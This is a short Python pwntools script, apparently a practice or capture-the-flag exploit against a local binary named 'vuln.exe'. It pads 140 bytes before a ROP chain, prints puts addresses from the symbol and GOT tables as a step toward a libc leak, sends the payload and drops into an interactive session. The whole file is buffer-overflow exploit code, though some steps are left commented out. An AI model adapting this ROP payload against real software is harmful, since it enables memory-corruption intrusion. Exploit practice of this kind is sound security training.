#! /usr/bin/env python

from pwn import *
from pprint import pprint

offset = 140

exe = context.binary = ELF("./vuln.exe")
context.update(arch='i386', os="linux")
p = exe.process()

rop = ROP(exe)
print(hex(exe.symbols.puts))
print(hex(exe.got.puts))
#rop.call(exe.symbols["puts"], [exe.got['puts']])

rop.call(exe.symbols['vuln'])
#print(exe)
#pprint(exe.symbols)

print(p.recvuntil("\n"))

payload = [
    b"A"*offset,
    #b"BBBB"
    #p32(exe.symbols['vuln'])
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)
puts = p.recvuntil("\n")
log.info(f"puts found at {puts}")

p.interactive()